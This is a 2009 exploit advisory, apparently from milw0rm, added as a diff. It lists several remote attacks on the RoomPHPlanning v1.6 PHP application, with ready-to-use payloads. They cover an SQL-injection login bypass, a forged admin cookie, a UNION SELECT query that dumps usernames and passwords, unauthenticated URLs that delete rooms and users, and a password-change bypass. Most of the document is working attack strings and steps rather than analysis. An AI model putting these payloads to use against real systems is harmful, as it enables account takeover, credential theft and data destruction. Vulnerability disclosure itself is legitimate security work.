@@ -1,0 +1,73 @@
+                                    o       o       o  O     O
+ ooooooo 0     oooo          OOOo  o       o       o  O O   O
+    0    0     0             o  o  o       o       o  O  O  O
+    0    0000  oooo  ooooo   o  o  oooooo  o       o  O   O O
+    0    0  0  0     0   0   o  o  O     O o       o  O    OO
+    0    0  0  oooo  ooooo   oooo  OOOOOO  oooooo {O} O     O
+                         0
+                         0 
+                         0
+                    0    0
+                    0oooo0
+################################################################################################
+[+] RoomPHPlanning v1.6 Multiple Remote Exploit Vulnerabilities
+[+] Discovered By : ThE g0bL!N      
+[+] Greetz : All my freind      
+[+] Note: Tested On localhost :)
+[+] Download:http://www.beaussier.com/roomphplanning/telecharge.php
+################################################################################################
+Auth Bypass
+-----------
+File: Login.php
+-----
+ $qry =  "SELECT IdUs, NameUs ".
+   "FROM ".USER." ". => Vuln
+   "WHERE LoginUs = '".$_GET['loginus']." ' ".
+   "AND PwdUs = '".$pwdus." ' "; => Vuln2
+Exploit:
+--------
+username:real_user' or '1=1
+password:ThE g0bL!N
+###############################################################################################
+Cookies Insecure
+------------
+File:Login.php
+----
+setcookie($cookie,$idus,time()+3600,"/");=> $cookiename=room_phplanning $idus= user_id
+Exploit:
+-------
+javascript:document.cookie="room_phplanning=[admin_id];path=/";
+Then go to Url: /admin/
+###############################################################################################
+SQL Injection
+-------------
+After login
+admin/userform.php?id=-1+union+select+1,concat(LoginUs,0x3a,PwdUs),3+FROM+rp_user+where%20IdUs=1--
+###############################################################################################
+Delete Rooms (out Of cookies)
+------------
+http://localhost/rp_1.6/rp_1.6/admin/delitem.php?room=$room id
+Example:
+-------
+http://localhost/rp_1.6/rp_1.6/admin/delitem.php?room=1
+Delete Users(out Of cookies)
+------------:
+http://localhost/rp_1.6/rp_1.6/admin/delitem.php?user=user id
+Example:
+-------
+http://localhost/rp_1.6/rp_1.6/admin/delitem.php?user=5
+###############################################################################################
+Remote Change Password Bypassing:
+--------------------------------
+Go to url:
+----------
+http://victim.co.il/changepwd.php
+Old Password :admin_name' or '1=1
+New Password New pass
+Write twice: Retype Your New pass
+Then Enter With New pass :)
+###############################################################################################
+Greeting ;His0k4 - Dr-HTmL - M0nSt3r-Dz Dz_V!RuS( win rak :( ) ViRuS_HaCkErS_Dz ( Djelloul Al meshakaf ) (:
+###############################################################################################
+
+# milw0rm.com [2009-05-26]
